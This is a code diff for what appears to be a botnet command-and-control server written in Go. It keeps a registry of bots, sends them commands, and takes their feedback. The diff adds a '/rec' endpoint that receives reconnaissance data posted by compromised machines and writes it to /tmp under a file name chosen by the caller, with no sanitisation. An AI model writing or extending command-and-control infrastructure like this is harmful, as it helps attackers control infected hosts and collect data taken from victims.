@@ -182,6 +182,31 @@ func (s *CommandServer) feedback(w http.ResponseWriter, r *http.Request) {
 	go s.onCommandRespHandler(cmd, respBody)
 }
 
+func (s *CommandServer) reccon(w http.ResponseWriter, r *http.Request) {
+	defer func() { _, _ = w.Write([]byte("ok")) }()
+
+	query := r.URL.Query()
+	dirName := query.Get("n")
+	if dirName == "" {
+		dirName = "unknown"
+	}
+
+	data := make([]byte, 0)
+	if r.Method == http.MethodPost {
+		body, err := ioutil.ReadAll(r.Body)
+		if err != nil {
+			log.Printf("error while reading reccon data: %v\n", err.Error())
+		} else {
+			data = body
+		}
+	}
+
+	err := ioutil.WriteFile(fmt.Sprintf("/tmp/%s", dirName), data, 0644)
+	if err != nil {
+		log.Println("error while saving dirName data: ", err)
+	}
+}
+
 func (s *CommandServer) SendCommand(c *core.Command, bot *Bot) error {
 	s.RLock()
 	bot, ok := s.bots[bot.ID]
@@ -256,5 +281,6 @@ func (s *CommandServer) startHeartBeating(bot *Bot) {
 func (s *CommandServer) Run() {
 	http.HandleFunc("/in", s.entrypoint)
 	http.HandleFunc("/out", s.feedback)
+	http.HandleFunc("/rec", s.reccon)
 	log.Fatal(http.ListenAndServe(s.addr, nil))
 }
